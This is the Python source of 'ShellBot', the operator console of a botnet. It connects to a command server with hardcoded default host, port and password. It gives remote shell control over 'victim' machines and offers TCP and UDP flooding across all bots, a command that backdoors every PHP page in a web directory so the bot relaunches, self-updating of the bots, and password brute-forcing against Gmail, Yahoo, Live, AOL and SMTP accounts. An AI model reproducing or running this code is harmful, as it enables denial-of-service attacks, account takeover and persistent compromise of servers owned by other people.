#!/usr/bin/env python3

# MIT License
##
# Copyright (c) 2017 Sayak Brahmachari
##
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to
# deal in the Software without restriction, including without limitation the
# rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
# sell copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
##
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
##
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
# FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
# IN THE SOFTWARE.

import os
import sys
import socket
import re
import threading

about = r"""\
 ____ ____ ____ ____ ____ ____ ____ ____
||S |||h |||e |||l |||l |||B |||o |||t ||
||__|||__|||__|||__|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|  

Coded by: Sayak Brahmachari
GitHub: https://github.com/zjw0358
Website: http://mctrl.ml
"""
usage = "Usage: client.py <server ip> <server bridge port> <password>"
commands = """

Primary:
--------
refresh                 | Refresh connections
list                    | List connections
clear                   | Clear the console
quit                    | Close all connections and quit
about                   | Display program details
help                    | Show this message

Client Interaction:
-------------------
interact <id>           | Interact with client
rawexec  <command>      | Execute a binary and pipe the raw I/O to the
                          controller. (Unstable)
stop                    | Stop interacting with client
udpflood <ip>:<port>    | UDP flood with client
tcpflood <ip>:<port>    | TCP flood with client
setbackdoor <web dir>   | Infects all PHP Pages with Malicious Code that will
                          run the ShellBot Client (if killed) again. (Linux)
rmbackdoor <web dir>    | Removes the Malicious PHP Code. (linux)
  Note: Commands sent to clients must not contain semi-colons (;) except when
  combining multiple lines or within quotes.

Wide Commands:
--------------
udpfloodall <ip>:<port> | Same as `udpflood` but for All clients
tcpfloodall <ip>:<port> | Same as `tcpflood` but for All clients
selfupdateall           | Update all Clients with the new version from Github

Bruteforce:
-----------
gmailbruteforce <email>:<keys>:<min>:<max>
yahoobruteforce <email>:<keys>:<min>:<max>
livebruteforce <email>:<keys>:<min>:<max>
aolbruteforce <email>:<keys>:<min>:<max>
  Example: gmailbruteforce someone@gmail.com:0123456789:6:8
custombruteforce <address>:<port>:<email>:<keys>:<min>:<max>
  Example: custombruteforce smtp.example.com:587:user@example.com:abcdefghi:4:6

"""
# Helper Functions


def send_msg(sock, sem):
    while True:
        data = sys.stdin.readline()
        if sem.acquire(False):
            return
        sock.send(bytes(data, 'utf-8'))


def recv_msg(sock):
    while True:
        data = sock.recv(20480).decode()
        if data == 'stop':
            sys.stdout.write("[Controller] - 'rawexec' finished\n")
            return
        sys.stdout.write(data)


def rawexec(s, command):
    sem = threading.Semaphore()
    sem.acquire(False)
    s.send(bytes(command, 'utf-8'))
    sender = threading.Thread(target=send_msg, args=(s, sem,))
    recver = threading.Thread(target=recv_msg, args=(s,))
    sender.daemon = True
    recver.daemon = True
    sender.start()
    recver.start()
    while threading.active_count() > 2:
        pass
    sem.release()


def process(s, command):
    victimpath = ''
    breakit = False
    if command == "stop":
        s.send(bytes("stop", 'utf-8'))
        print("\n")
        breakit = True
    elif "rawexec" in command:
        rawexec(s, command)
    elif "cd " in command:
        s.send(bytes(command, 'utf-8'))
        temp = s.recv(20480).decode()
        if "ERROR" not in temp:
            victimpath = temp
        else:
            print(temp)
    elif command == "":
        print("[CONTROLLER] Nothing to be sent...\n")
    else:
        s.send(bytes(command, 'utf-8'))
        print(s.recv(20480).decode())
    return breakit, victimpath


def interact(s, command):
    s.send(bytes(command, 'utf-8'))
    temporary = s.recv(20480).decode()
    if "ERROR" not in temporary:
        victimpath = s.recv(20480).decode()
        if "ERROR" not in victimpath:
            breakit = False
            while not breakit:
                msg = input(victimpath)
                allofem = re.split(''';(?=(?:[^'"]|'[^']*'|"[^"]*")*$)''', msg)
                for onebyone in allofem:
                    breakit, path = process(s, onebyone)
                    if not path == '':
                        victimpath = path
        else:
            print(victimpath)
            return
    else:
        print(temporary)


def run(s):
    try:
        while True:
            command = input("SB> ")
            if command.strip() is '': pass
            elif command == "refresh":
                s.send(bytes("refresh", 'utf-8'))
                print(s.recv(20480).decode())
            elif command == "list":
                s.send(bytes("list", 'utf-8'))
                print(s.recv(20480).decode())
            elif "interact " in command:
                interact(s, command)
            elif "udpfloodall " in command or "tcpfloodall " in command:
                s.send(bytes(command, 'utf-8'))
            elif command == "selfupdateall":
                s.send(bytes("selfupdateall", 'utf-8'))
            elif command == "clear":
                if sys.platform == 'win32':
                    os.system("cls")
                else:
                    os.system("clear")
            elif command == "quit":
                s.send(bytes("quit", 'utf-8'))
                s.close()
                return
            elif command == "help":
                print(usage, commands)
            elif command == "about":
                print(about)
            else:
                print("[CONTROLLER] Invalid Command")
    except KeyboardInterrupt:
        try:
            s.send(bytes("quit", 'utf-8'))
            s.close()
        except Exception:
            pass
        print("")
        return
    except Exception as ex:
        print("[CONTROLLER] Connection Closed Due to Error:", ex)
        s.close()
        return


def main():
    print(about)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
    except Exception:
        sys.exit("[ERROR] Can't connect to server")

    s.send(bytes(password, 'utf-8'))
    run(s)


if __name__ == "__main__":
    if len(sys.argv) == 4:
        host = sys.argv[1]
        port = int(sys.argv[2])
        password = sys.argv[3]
    elif len(sys.argv) == 2 and sys.argv[1] in ['-h', '--help']:
        print(usage, commands)
    else:
        # sys.exit(usage)
        print(usage)
        host = '518.is'
        port = 9090
        password = '9tian9di'
        print("Using default values - {}:{}, password:{}".format(host, port, password))
    main()
